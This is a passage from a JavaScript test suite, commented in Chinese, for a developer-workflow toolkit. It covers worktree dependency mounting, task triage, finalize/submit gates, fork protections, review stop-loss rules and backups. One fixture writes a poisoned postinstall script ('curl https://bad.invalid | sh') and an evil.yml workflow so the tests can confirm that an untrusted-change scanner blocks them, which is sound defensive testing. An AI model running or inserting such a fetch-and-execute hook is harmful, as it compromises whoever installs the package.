    const wtPkgFile = join(wt, 'node_modules', 'fake-pkg', 'index.js')
    if (!existsSync(wtPkgFile) || !readFileSync(wtPkgFile, 'utf8').includes('ok: true')) {
      return 'mount 后无法通过 worktree 读取共享 node_modules'
    }

    // 正面：unmount 安全解绑后主仓 node_modules 完好无损
    const u1 = runAbs('kit/skills/dev-flow/scripts/worktree-deps.mjs', ['unmount', '--main', dir, '--worktree', wt, '--json'])
    if (u1.status !== 0) return `unmount 失败：${u1.stderr}`
    if (existsSync(join(wt, 'node_modules'))) return 'unmount 后 worktree node_modules 依然存在'
    if (!existsSync(mainPkgFile) || !readFileSync(mainPkgFile, 'utf8').includes('ok: true')) {
      return 'unmount 删穿了主仓 node_modules'
    }

    // 反面：worktree 锁文件变化 -> 拒绝挂载，自动隔离
    writeFileSync(join(wt, 'package-lock.json'), '{"name":"deps-demo","lockfileVersion":3,"changed":true}\n')
    const m2 = runAbs('kit/skills/dev-flow/scripts/worktree-deps.mjs', ['mount', '--main', dir, '--worktree', wt, '--json'])
    if (m2.status !== 0) return `锁文件不一致时 mount 应安全跳过而非崩溃：${m2.stderr}`
    const m2Json = JSON.parse(m2.stdout)
    if (m2Json.mode !== 'isolated' || m2Json.reason !== 'lockfile-changed' || (m2Json.mismatches?.length ?? 0) === 0 || m2Json.mounted.length !== 0 || existsSync(join(wt, 'node_modules'))) {
      return `锁文件变化后未自动隔离：${m2.stdout}`
    }

    return true
  } finally {
    try { runAbs('kit/skills/dev-flow/scripts/worktree-deps.mjs', ['unmount', '--main', dir, '--worktree', wt]) } catch {}
    spawnSync('git', ['worktree', 'remove', '--force', wt], { cwd: dir, stdio: 'ignore' })
    rmTree(dir)
  }
}])

cases.push(['flow.mjs + doc-plan.mjs：五档分流、Issue+PR 复用与依赖图、finalize/verify/submit 硬锁、fork 禁止合并与删前锁定', async () => {
  const { triageTask } = await import('../../kit/skills/dev-plan/scripts/doc-plan.mjs')
  const { analyzeIssueDependencies } = await import('../../kit/skills/dev-flow/scripts/flow.mjs')

  // 1. 五档分流全覆盖（Case 1..5）
  if (triageTask({ summary: '修正 README 错别字', files: 1 }).caseType !== 1) return 'Case 1 分流误判'
  if (triageTask({ summary: 'fix parser crash on empty input', files: 1, bugfix: true }).caseType !== 2) return 'Case 2 分流误判'
  if (triageTask({ summary: 'feat: add CSV output flag', files: 2 }).caseType !== 3) return 'Case 3 分流误判'
  if (triageTask({ summary: '跨模块接口变更', touchesContract: true }).caseType !== 4) return 'Case 4 分流误判'
  const c5 = triageTask({ summary: '推翻 TDD 架构重新设计核心引擎', conflictsTdd: true })
  if (c5.caseType !== 5 || c5.blocked !== true) return `Case 5 未阻断：${JSON.stringify(c5)}`

  // 2. 多 Issue 依赖边与环检测
  const graphOk = analyzeIssueDependencies([
    { number: 1, relations: { dependsOn: [], blocks: [] } },
    { number: 2, relations: { dependsOn: [1], blocks: [3] } },
    { number: 3, relations: { dependsOn: [], blocks: [] } },
  ])
  if (graphOk.hasCycle || graphOk.edges.length < 2 || graphOk.orderedIssues[0] !== 1 || graphOk.orderedIssues[2] !== 3) {
    return `依赖拓扑解析失败：${JSON.stringify(graphOk)}`
  }
  const graphCycle = analyzeIssueDependencies([
    { number: 10, relations: { dependsOn: [11], blocks: [] } },
    { number: 11, relations: { dependsOn: [10], blocks: [] } },
  ])
  if (!graphCycle.hasCycle) return '环形 Issue 依赖未检出'

  // 3. 真实本地工作流：Case 3 start -> Todo 未勾选阻断 finalize -> 未 finalize 阻断 submit -> 代码改动使 verifiedHead 失效 -> submit 成功
  const localDir = tmpProject({
    '.gitignore': '.worktrees/\n',
    'package.json': '{"name":"flow-local","version":"1.0.0"}\n',
    'README.md': '# flow-local\n',
    'docs/TDD.md': '# TDD\n',
    'src/app.mjs': 'export const n = 1\n',
  })
  gitInit(localDir)
  spawnSync('git', ['branch', '-M', 'main'], { cwd: localDir, stdio: 'ignore' })
  spawnSync('git', ['config', 'user.name', 't'], { cwd: localDir, stdio: 'ignore' })
  spawnSync('git', ['config', 'user.email', 't@t.t'], { cwd: localDir, stdio: 'ignore' })

  try {
    const start1 = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['start', '--task', 't-flow', '--case', '3', '--slug', 'demo-feat', '--json'], { cwd: localDir })
    if (start1.status !== 0) return `flow start 失败：${start1.stderr}`
    const ledger1 = JSON.parse(start1.stdout)
    const wtRoot = join(localDir, ledger1.worktreePath)

    // 建未勾选 Todo -> finalize 必须失败
    const todoInit = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['init', '--type', 'todo', '--slug', 'demo-feat', '--title', '测试任务', '--task', 't-flow', '--json'], { cwd: wtRoot })
    if (todoInit.status !== 0) return `doc-plan init todo 失败：${todoInit.stderr}`
    const todoInfo = JSON.parse(todoInit.stdout)

    const finBlocked = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['finalize', '--task', 't-flow'], { cwd: wtRoot })
    if (finBlocked.status === 0) return 'Todo 仍有未勾选条目，finalize 却放行了'

    // 勾选 Todo 并提交；故意不运行 finalize，先 verify 再 submit -> submit 必须返回 3（BLOCKED_NOT_FINALIZED）
    const todoAbs = join(wtRoot, todoInfo.file)
    writeFileSync(todoAbs, readFileSync(todoAbs, 'utf8').replace(/- \[ \]/g, '- [x]'))
    spawnSync('git', ['add', '-A'], { cwd: wtRoot, stdio: 'ignore' })
    spawnSync('git', ['commit', '-qm', 'check todo'], { cwd: wtRoot, stdio: 'ignore' })

    const v1 = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-flow', '--cmd', 'node -e "process.exit(0)"'], { cwd: wtRoot })
    if (v1.status !== 0) return `verify 失败：${v1.stderr}`
    const subNoFin = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['submit', '--task', 't-flow'], { cwd: wtRoot })
    if (subNoFin.status !== 3 || !/BLOCKED_NOT_FINALIZED/.test(subNoFin.stderr)) {
      return `未 finalize 时 submit 未拦截：exit=${subNoFin.status} stderr=${subNoFin.stderr}`
    }

    // finalize 后再改非文档代码并提交，使 verifiedHead !== HEAD -> submit 必须拦截
    const finOk = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['finalize', '--task', 't-flow'], { cwd: wtRoot })
    if (finOk.status !== 0) return `finalize 失败：${finOk.stderr}`
    spawnSync('git', ['add', '-A'], { cwd: wtRoot, stdio: 'ignore' })
    spawnSync('git', ['commit', '-qm', 'archive todo'], { cwd: wtRoot, stdio: 'ignore' })

    writeFileSync(join(wtRoot, 'src/app.mjs'), 'export const n = 2\n')
    spawnSync('git', ['add', '-A'], { cwd: wtRoot, stdio: 'ignore' })
    spawnSync('git', ['commit', '-qm', 'code change after verify'], { cwd: wtRoot, stdio: 'ignore' })
    const subStale = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['submit', '--task', 't-flow'], { cwd: wtRoot })
    if (subStale.status !== 3) return `代码变更后 verifiedHead 失效未拦截 submit：exit=${subStale.status} stderr=${subStale.stderr}`

    // 重跑 finalize + verify -> submit 放行退出 0
    runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['finalize', '--task', 't-flow'], { cwd: wtRoot })
    runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-flow', '--cmd', 'node -e "process.exit(0)"'], { cwd: wtRoot })
    const subOk = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['submit', '--task', 't-flow'], { cwd: wtRoot })
    if (subOk.status !== 0) return `本地完整校验后 submit 失败：exit=${subOk.status} stderr=${subOk.stderr}`
  } finally {
    const wtCleanup = join(localDir, '.worktrees', 'impl-t-flow')
    spawnSync('git', ['worktree', 'remove', '--force', wtCleanup], { cwd: localDir, stdio: 'ignore' })
    rmTree(localDir)
  }

  // 4. inspect 识别已有 Issue+PR 复用；contributor-fork 禁止 merge 与 OPEN PR 禁止 cleanup
  const forkDir = tmpProject({
    '.gitignore': '.worktrees/\n',
    'package.json': '{"name":"fork-demo","version":"1.0.0"}\n',
    'README.md': '# fork-demo\n',
  })
  gitInit(forkDir)
  spawnSync('git', ['branch', '-M', 'main'], { cwd: forkDir, stdio: 'ignore' })
  spawnSync('git', ['config', 'user.name', 'me'], { cwd: forkDir, stdio: 'ignore' })
  spawnSync('git', ['config', 'user.email', 'me@example.com'], { cwd: forkDir, stdio: 'ignore' })
  spawnSync('git', ['remote', 'add', 'origin', 'https://github.com/me/fork-demo.git'], { cwd: forkDir, stdio: 'ignore' })
  spawnSync('git', ['remote', 'add', 'upstream', 'https://github.com/upstream/fork-demo.git'], { cwd: forkDir, stdio: 'ignore' })

  try {
    const insp = runAbs('kit/skills/dev-flow/scripts/flow.mjs', [
      'inspect', 'https://github.com/upstream/fork-demo/issues/12', 'https://github.com/upstream/fork-demo/pull/34', '--json',
    ], { cwd: forkDir })
    if (insp.status !== 0) return `inspect 失败：${insp.stderr}`
    const inspJson = JSON.parse(insp.stdout)
    if (inspJson.identity.role !== 'contributor-fork') return `fork 角色错误：${inspJson.identity.role}`
    if (!inspJson.inputs?.reuseExistingPr || inspJson.inputs.reuseExistingPr.prNumber !== 34) {
      return `inspect 未输出已有 PR 复用提示：${JSON.stringify(inspJson.inputs)}`
    }

    const fStart = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['start', '--task', 't-fork', '--case', '1', '--slug', 'fix-doc', '--pr', '34', '--json'], { cwd: forkDir })
    if (fStart.status !== 0) return `fork start 失败：${fStart.stderr}`
    const fVerify = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['verify', '--task', 't-fork', '--cmd', 'node -e "process.exit(0)"'], { cwd: forkDir })
    if (fVerify.status !== 0) return `fork verify 失败：${fVerify.stderr}`

    const mBlocked = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['merge', '--task', 't-fork'], { cwd: forkDir })
    if (mBlocked.status !== 3 || !/BLOCKED_FORK_CANNOT_MERGE/.test(mBlocked.stderr)) {
      return `contributor-fork 未禁止 merge：exit=${mBlocked.status} stderr=${mBlocked.stderr}`
    }

    // 清理未带 --confirm 必须阻断（exit 3）
    const cNoConfirm = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['cleanup', '--task', 't-fork'], { cwd: forkDir })
    if (cNoConfirm.status !== 3 || !/BLOCKED_CONFIRMATION_REQUIRED/.test(cNoConfirm.stdout)) {
      return `cleanup 未带 --confirm 未阻断：exit=${cNoConfirm.status} out=${cNoConfirm.stdout}`
    }

    // 将 PR 状态写为 OPEN 后，哪怕带 --confirm 也必须硬锁拒绝删 Fork 分支（exit 3）
    const ledgerFile = join(forkDir, '.worktrees', '.state', 'tasks', 't-fork.json')
    const lObj = JSON.parse(readFileSync(ledgerFile, 'utf8'))
    lObj.prState = 'OPEN'
    writeFileSync(ledgerFile, JSON.stringify(lObj, null, 2))

    const cOpenPr = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['cleanup', '--task', 't-fork', '--confirm'], { cwd: forkDir })
    if (cOpenPr.status !== 3 || !/BLOCKED_OPEN_FORK_PR/.test(cOpenPr.stderr)) {
      return `上游 PR OPEN 时 cleanup --confirm 未硬锁：exit=${cOpenPr.status} stderr=${cOpenPr.stderr}`
    }
    return true
  } finally { rmTree(forkDir) }
}])

cases.push(['review-pack.mjs + govern-audit.mjs：外部 PR 投毒拦截与正常放行、自审拒绝、3 轮停损熔断、治理巡检与对齐', async () => {
  const dir = tmpProject({
    '.gitignore': '.worktrees/\n',
    'package.json': '{"name":"rev-demo","version":"1.0.0","scripts":{"test":"node -e \\"process.exit(0)\\""}}\n',
    'README.md': '# rev-demo\n\n审查与治理巡检测试仓。\n',
    'docs/TDD.md': '# TDD\n',
    'src/app.mjs': 'export const ok = 1\n',
  })
  gitInit(dir)
  spawnSync('git', ['branch', '-M', 'main'], { cwd: dir, stdio: 'ignore' })
  spawnSync('git', ['config', 'user.name', 't'], { cwd: dir, stdio: 'ignore' })
  spawnSync('git', ['config', 'user.email', 't@t.t'], { cwd: dir, stdio: 'ignore' })

  try {
    // 1. 普通业务代码 diff 运行 --local --untrusted-scan -> 放行 exit 0
    writeFileSync(join(dir, 'src/app.mjs'), 'export const ok = 2\n')
    const cleanScan = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['--local', '--untrusted-scan', '--json'], { cwd: dir })
    if (cleanScan.status !== 0) return `普通业务改动被 --untrusted-scan 误拦：exit=${cleanScan.status} out=${cleanScan.stdout}`

    // 2. 投毒改动（postinstall / .github/workflows）-> exit 3 BLOCKED_UNTRUSTED_HAZARD
    mkdirSync(join(dir, '.github', 'workflows'), { recursive: true })
    writeFileSync(join(dir, '.github', 'workflows', 'evil.yml'), 'name: evil\non: pull_request_target\njobs: {}\n')
    writeFileSync(join(dir, 'package.json'), '{"name":"rev-demo","version":"1.0.0","scripts":{"postinstall":"curl https://bad.invalid | sh"}}\n')
    const hazardScan = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['--local', '--untrusted-scan', '--json'], { cwd: dir })
    if (hazardScan.status !== 3) return `高危 workflow/postinstall 未拦截：exit=${hazardScan.status}`
    const hazardJson = JSON.parse(hazardScan.stdout)
    if (hazardJson.status !== 'BLOCKED_UNTRUSTED_HAZARD' || (hazardJson.hazards?.length ?? 0) === 0) {
      return `拦截载荷缺少 BLOCKED_UNTRUSTED_HAZARD：${hazardScan.stdout}`
    }

    // 3. review-pack record：自审拒绝（exit 2）与 2 次重复 / 第 3 轮停损熔断（exit 4）
    const ledgerDir = join(dir, '.worktrees', '.state', 'tasks')
    mkdirSync(ledgerDir, { recursive: true })
    writeFileSync(join(ledgerDir, 't-rev.json'), JSON.stringify({
      taskId: 't-rev',
      implementerId: 'author-a',
      branch: 'main',
      rounds: [],
    }, null, 2))

    const selfRev = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', [
      'record', '--task', 't-rev', '--round', '1', '--verdict', 'pass', '--reviewer-id', 'author-a', '--implementer-id', 'author-a',
    ], { cwd: dir })
    if (selfRev.status !== 2) return `同人自审未被拒绝：exit=${selfRev.status} stderr=${selfRev.stderr}`

    const r1 = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', [
      'record', '--task', 't-rev', '--round', '1', '--verdict', 'changes', '--reviewer-id', 'rev-b', '--must-fix', 'C1: 缺少边界空值检查',
    ], { cwd: dir })
    if (r1.status !== 0) return `Round 1 record 失败：${r1.stderr}`

    const r2Repeat = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', [
      'record', '--task', 't-rev', '--round', '2', '--verdict', 'changes', '--reviewer-id', 'rev-b', '--must-fix', 'C1: 缺少边界空值检查',
    ], { cwd: dir })
    if (r2Repeat.status !== 4 || !/STOP_LOSS_ESCALATE/.test(r2Repeat.stdout + r2Repeat.stderr)) {
      return `连续两轮同一 must-fix 未触发停损（应 exit 4）：exit=${r2Repeat.status} out=${r2Repeat.stdout}`
    }

    // 第 3 轮上限测试（无重复问题，第 3 轮仍 verdict=changes 必须 exit 4）
    writeFileSync(join(ledgerDir, 't-r3.json'), JSON.stringify({ taskId: 't-r3', implementerId: 'author-a', rounds: [] }, null, 2))
    runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['record', '--task', 't-r3', '--round', '1', '--verdict', 'changes', '--reviewer-id', 'rev-b', '--must-fix', 'C1: 问题一'], { cwd: dir })
    runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['record', '--task', 't-r3', '--round', '2', '--verdict', 'changes', '--reviewer-id', 'rev-b', '--must-fix', 'C2: 问题二'], { cwd: dir })
    const r3Stop = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['record', '--task', 't-r3', '--round', '3', '--verdict', 'changes', '--reviewer-id', 'rev-b', '--must-fix', 'C3: 问题三'], { cwd: dir })
    if (r3Stop.status !== 4) return `第 3 轮上限未触发停损：exit=${r3Stop.status}`

    // 4. govern-audit.mjs --audit-only 与 reconcile
    const cleanAuditDir = tmpProject({
      'package.json': '{"name":"gov-demo","version":"1.0.0","scripts":{"test":"node -e \\"process.exit(0)\\""}}\n',
      'README.md': '# gov-demo\n\n治理测试仓说明。\n',
      'docs/TDD.md': '# TDD\n',
      'src/app.mjs': 'export const ok = 1\n',
      'test/app.test.mjs': 'import assert from "node:assert/strict"; assert.equal(1, 1);\n',
    })
    gitInit(cleanAuditDir)
    try {
      runAbs('scripts/equip.mjs', [cleanAuditDir])
      runAbs('scripts/compose-agents.mjs', [cleanAuditDir])
      const auditRun = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['--audit-only', '--dir', cleanAuditDir, '--json'])
      if (auditRun.status !== 0) return `govern-audit --audit-only 失败：exit=${auditRun.status} stderr=${auditRun.stderr}`
      const auditJson = JSON.parse(auditRun.stdout)
      if (!Array.isArray(auditJson.findings)) return `govern-audit 输出缺 findings：${auditRun.stdout}`

      const recRun = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['reconcile', cleanAuditDir, '--json'])
      if (recRun.status !== 0) return `govern-audit reconcile 失败：exit=${recRun.status} stderr=${recRun.stderr}`
      const recJson = JSON.parse(recRun.stdout)
      if (!Array.isArray(recJson.findings)) return `govern-audit reconcile 输出缺 findings：${recRun.stdout}`
    } finally { rmTree(cleanAuditDir) }

    return true
  } finally { rmTree(dir) }
}])

cases.push(['backup.mjs + equip/compose-agents：写前快照创建、恢复防污染清理多余文件、dry-run 与空变更跳过', async () => {
  const backupStore = mkdtempSync(join(tmpdir(), 'pf-bk-'))
  const bkEnv = { ...process.env, PF_BACKUP_DIR: backupStore }
  const dir = tmpProject({
    'package.json': '{"name":"bk-demo","version":"1.0.0"}\n',
    'README.md': '# bk-demo\n\n备份测试项目。\n',
    'src/a.mjs': 'export const a = 1\n',
    'src/b.mjs': 'export const b = 2\n',
  })

  try {
    // 1. 直接创建快照 -> 落在 PF_BACKUP_DIR 下且项目目录不被污染
    const cr = runAbs('scripts/backup.mjs', ['create', dir, '--label', 'snap', '--json'], { env: bkEnv })
    if (cr.status !== 0) return `backup create 失败：${cr.stderr}`
    const crJson = JSON.parse(cr.stdout)
    if (!crJson.created || crJson.count < 4 || !existsSync(crJson.archivePath)) {
      return `快照未成功创建：${cr.stdout}`
    }
    if (!crJson.backupDir.startsWith(backupStore)) return `快照未落入 PF_BACKUP_DIR：${crJson.backupDir}`

    // list 命中快照
    const ls = runAbs('scripts/backup.mjs', ['list', dir, '--json'], { env: bkEnv })
    if (ls.status !== 0) return `backup list 失败：${ls.stderr}`
    const lsJson = JSON.parse(ls.stdout)
    if ((lsJson.backups?.length ?? 0) !== 1) return `backup list 计数不对：${ls.stdout}`

    // 2. 篡改原文件 + 删文件 + 制造写后新增孤儿文件，先验证 --dry-run 不落盘
    writeFileSync(join(dir, 'src/a.mjs'), 'export const a = 999\n')
    rmSync(join(dir, 'src/b.mjs'))
    writeFileSync(join(dir, 'src/orphan-extra.mjs'), 'export const extra = 1\n')
    mkdirSync(join(dir, 'sub'), { recursive: true })
    writeFileSync(join(dir, 'sub/orphan2.mjs'), 'export const o2 = 1\n')

    const dr = runAbs('scripts/backup.mjs', ['restore', dir, '--id', 'latest', '--dry-run', '--json'], { env: bkEnv })
    if (dr.status !== 0) return `backup restore dry-run 失败：${dr.stderr}`
    const drJson = JSON.parse(dr.stdout)
    if (!drJson.dryRun || !drJson.removedOrphans.includes('src/orphan-extra.mjs') || !drJson.removedOrphans.includes('sub/orphan2.mjs')) {
      return `dry-run 未识别待清理多余文件：${dr.stdout}`
    }
    if (!existsSync(join(dir, 'src/orphan-extra.mjs')) || existsSync(join(dir, 'src/b.mjs'))) {
      return 'restore --dry-run 竟直接改写了磁盘文件'
    }

    // 3. 真实 restore -> 原文件完好恢复，且多余文件与空目录被彻底清理
    const rs = runAbs('scripts/backup.mjs', ['restore', dir, '--id', 'latest', '--json'], { env: bkEnv })
    if (rs.status !== 0) return `backup restore 失败：${rs.stderr}`
    if (readFileSync(join(dir, 'src/a.mjs'), 'utf8') !== 'export const a = 1\n') return 'restore 未恢复 src/a.mjs'
    if (readFileSync(join(dir, 'src/b.mjs'), 'utf8') !== 'export const b = 2\n') return 'restore 未恢复 src/b.mjs'
    if (existsSync(join(dir, 'src/orphan-extra.mjs')) || existsSync(join(dir, 'sub/orphan2.mjs')) || existsSync(join(dir, 'sub'))) {
      return `restore 未清理多余文件：${dir}`
    }

    // 4. --no-backup 与幂等空变更跳过
    const bkFilesBeforeNoBk = readdirSync(crJson.backupDir).length
    const caNoBk = runAbs('scripts/compose-agents.mjs', [dir, '--no-backup'], { env: bkEnv })
    if (caNoBk.status !== 0) return `compose-agents --no-backup 失败：${caNoBk.stderr}`
    if (readdirSync(crJson.backupDir).length !== bkFilesBeforeNoBk) return 'compose-agents --no-backup 仍创建了快照'

    const eq1 = runAbs('scripts/equip.mjs', [dir], { env: bkEnv })
    if (eq1.status !== 0) return `equip 首次运行失败：${eq1.stderr}`
    const eq1Json = JSON.parse(eq1.stdout).equip
    if (!eq1Json?.backup?.created) return `equip 首次变更未触发写前快照：${eq1.stdout}`

    const eq2 = runAbs('scripts/equip.mjs', [dir], { env: bkEnv })
    if (eq2.status !== 0) return `equip 二次运行失败：${eq2.stderr}`
    const eq2Json = JSON.parse(eq2.stdout).equip
    if (eq2Json?.backup?.created || eq2Json?.backup?.skippedReason !== 'no-pending-changes') {
      return `equip 无变更二次运行未跳过快照：${eq2.stdout}`
    }

    const agentsFilled = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
      .replace(/^<!-- project-forge: fill [^\n]*-->$/gm, '已填写。')
    writeFileSync(join(dir, 'AGENTS.md'), agentsFilled)
    const caCheck = runAbs('scripts/compose-agents.mjs', [dir, '--check'], { env: bkEnv })
    if (caCheck.status !== 0) return `compose-agents --check 失败：${caCheck.stderr}`
    const bkCountAfterCheck = JSON.parse(runAbs('scripts/backup.mjs', ['list', dir, '--json'], { env: bkEnv }).stdout).backups.length
    if (bkCountAfterCheck !== 2) return `--check 只读检查意外生成了快照：count=${bkCountAfterCheck}`

    return true
  } finally {
    rmTree(dir)
    rmTree(backupStore)
  }
}])

cases.push(['repo-map.mjs Wave 2 扩展：CI run、Makefile/justfile、reusableModules、Feature Map 正反双向', async () => {
  const posDir = tmpProject({
    '.github/workflows/ci.yml': 'name: CI\non: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n',
    Makefile: 'check:\n\tnode --test\n',
    justfile: 'lint:\n\techo ok\n',
    'AGENTS.md': '# demo\n\n```yaml\nquick-test: node --test\nsmoke-verify: node src/cli.mjs --smoke\n```\n',
    'package.json': '{"name":"rmap-pos","version":"1.0.0","main":"src/cli.mjs"}\n',
    'src/utils.mjs': 'export function helper() { return 1 }\n',
    'src/cli.mjs': 'import { helper } from "./utils.mjs"\nconsole.log(helper())\n',
    'test/cli.test.mjs': 'import assert from "node:assert/strict"\nassert.equal(1, 1)\n',
  })
  const negDir = tmpProject({
    'README.md': '# plain\n',
    'src/index.mjs': 'export const x = 1\n',
  })

  try {
    const pos = runAbs('kit/skills/dev-explore/scripts/repo-map.mjs', [posDir, '--json'])
    if (pos.status !== 0) return `repo-map 正面运行失败：${pos.stderr}`
    const pj = JSON.parse(pos.stdout)
    if (!pj.ciRunSteps?.some((s) => s.command.includes('npm test'))) return `未提取 CI run 步骤：${JSON.stringify(pj.ciRunSteps)}`
    if (!pj.taskRunners?.makefile?.includes('check') || !pj.taskRunners?.justfile?.includes('lint')) {
      return `未提取 Makefile/justfile 目标：${JSON.stringify(pj.taskRunners)}`
    }
    if (pj.devProfile?.smokeVerify !== 'node src/cli.mjs --smoke') return `未读取 smoke-verify：${pj.devProfile?.smokeVerify}`
    if (!pj.preferredVerifyCommands?.some((c) => c.role === 'smoke-verify')) {
      return `preferredVerifyCommands 缺少 smoke-verify：${JSON.stringify(pj.preferredVerifyCommands)}`
    }
    if (!pj.reusableModules?.some((m) => m.file === 'src/utils.mjs' && m.exports.includes('helper'))) {
      return `未提取可复用模块 src/utils.mjs：${JSON.stringify(pj.reusableModules)}`
    }
    if ((pj.featureMap?.length ?? 0) === 0) return 'featureMap 为空'

    const neg = runAbs('kit/skills/dev-explore/scripts/repo-map.mjs', [negDir, '--json'])
    if (neg.status !== 0) return `repo-map 反面运行失败：${neg.stderr}`
    const nj = JSON.parse(neg.stdout)
    if ((nj.ciRunSteps?.length ?? 0) !== 0 || (nj.taskRunners?.makefile?.length ?? 0) !== 0 || (nj.taskRunners?.justfile?.length ?? 0) !== 0) {
      return `无 CI/Makefile/justfile 项目误报提取结果：${neg.stdout}`
    }
    if (nj.devProfile?.smokeVerify !== null) return `无 AGENTS.md 项目误报 smokeVerify：${nj.devProfile?.smokeVerify}`
    return true
  } finally {
    rmTree(posDir)
    rmTree(negDir)
  }
}])

cases.push(['doc-plan.mjs Wave 2 契约：critiqueTier 分级、audit 防幻觉与占位拦截、critique-pass 防篡改、approve 与豁免', async () => {
  const { triageTask } = await import('../../kit/skills/dev-plan/scripts/doc-plan.mjs')
  const t3 = triageTask({ summary: 'add export flag', files: 2 })
  const t4 = triageTask({ summary: 'alter contract schema', touchesContract: true })
  if (t3.critiqueTier !== 'self-audit') return `Case 3 critiqueTier 错误：${t3.critiqueTier}`
  if (t4.critiqueTier !== 'independent-critique') return `Case 4 critiqueTier 错误：${t4.critiqueTier}`

  const dir = tmpProject({
    'src/real.mjs': 'export const ok = 1\n',
    'docs/specs/bad.md': [
      '# Bad Spec',
      '- Status: draft',
      '',
      '修改 `src/ghost.mjs` 与 `<target>`。',
    ].join('\n'),
    'docs/specs/good.md': [
      '# Good Spec',
      '- Status: draft',
      '- Plan Critique: pending',
      '',
      '改动 `src/real.mjs` 与 `src/planned.mjs` (new)。',
      '',
      '## 本期不做',
      '',
      '- 不修改外部公共 CLI。',
      '',
      '## 门型与回滚路径',
      '',
      '- 门型：two-way，直接 `git revert` 即可回滚。',
      '',
      '## 验收标准',
      '',
      '- [ ] C1: `node src/real.mjs` 退出码为 0。',
      '',
    ].join('\n'),
    'docs/specs/exempt.md': [
      '# Exempt Spec',
      '- Status: draft',
      '- Plan Critique: pending',
      '',
      '修改 `src/real.mjs`。',
      '',
      '## 本期不做',
      '',
      '- 不改其他模块。',
      '',
      '## 门型与回滚路径',
      '',
      '- 门型：two-way，可回退。',
      '',
      '## 验收标准',
      '',
      '- [ ] C1: 验证通过。',
      '',
    ].join('\n'),
  })

  try {
    // 1. 坏 SPEC audit 与 approve 必须阻断
    const badAudit = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['audit', '--file', 'docs/specs/bad.md', '--json'], { cwd: dir })
    if (badAudit.status === 0) return '缺陷 SPEC 的 audit 竟通过了'
    const badJson = JSON.parse(badAudit.stdout)
    const codes = new Set(badJson.errors.map((e) => e.code))
    for (const req of ['UNRESOLVED_ANGLE_PLACEHOLDER', 'HALLUCINATED_PATH', 'MISSING_NON_GOALS', 'MISSING_DOOR_OR_ROLLBACK', 'MISSING_ACCEPTANCE_CRITERIA']) {
      if (!codes.has(req)) return `坏 SPEC audit 漏报 ${req}：${badAudit.stdout}`
    }
    const badApprove = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['approve', '--file', 'docs/specs/bad.md'], { cwd: dir })
    if (badApprove.status === 0 || !/BLOCKED_AUDIT_FAILED/.test(badApprove.stderr)) {
      return `未通过 audit 的 SPEC 竟被 approve 放行：${badApprove.stderr}`
    }

    // 2. 好 SPEC audit 放行，但未 critique-pass 不允许直接 approve
    const goodAudit = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['audit', '--file', 'docs/specs/good.md', '--json'], { cwd: dir })
    if (goodAudit.status !== 0) return `合规 SPEC audit 误杀：${goodAudit.stdout}\n${goodAudit.stderr}`

    const noCritApprove = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['approve', '--file', 'docs/specs/good.md'], { cwd: dir })
    if (noCritApprove.status === 0 || !/BLOCKED_CRITIQUE_REQUIRED/.test(noCritApprove.stderr)) {
      return `未 critique-pass 的 SPEC 竟被 approve 放行：exit=${noCritApprove.status} stderr=${noCritApprove.stderr}`
    }

    // 3. critique-pass 后篡改正文 -> BLOCKED_CRITIQUE_STALE
    const crit1 = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['critique-pass', '--file', 'docs/specs/good.md', '--reviewer', 'indep-r1', '--round', '1', '--json'], { cwd: dir })
    if (crit1.status !== 0) return `critique-pass 失败：${crit1.stderr}`

    const goodAbs = join(dir, 'docs/specs/good.md')
    writeFileSync(goodAbs, readFileSync(goodAbs, 'utf8') + '\n- 事后偷偷追加的范围\n')
    const staleApprove = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['approve', '--file', 'docs/specs/good.md'], { cwd: dir })
    if (staleApprove.status === 0 || !/BLOCKED_CRITIQUE_STALE/.test(staleApprove.stderr)) {
      return `critique-pass 后篡改正文未拦截：exit=${staleApprove.status} stderr=${staleApprove.stderr}`
    }

    // 4. 重审并 approve 成功；另测 --skip-critique-reason 豁免
    const crit2 = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['critique-pass', '--file', 'docs/specs/good.md', '--reviewer', 'indep-r1', '--round', '2', '--json'], { cwd: dir })
    if (crit2.status !== 0) return `二次 critique-pass 失败：${crit2.stderr}`
    const okApprove = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['approve', '--file', 'docs/specs/good.md', '--json'], { cwd: dir })
    if (okApprove.status !== 0 || JSON.parse(okApprove.stdout).status !== 'approved') {
      return `复核后 approve 失败：${okApprove.stderr}`
    }

    const exApprove = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['approve', '--file', 'docs/specs/exempt.md', '--skip-critique-reason', 'emergency-fix', '--json'], { cwd: dir })
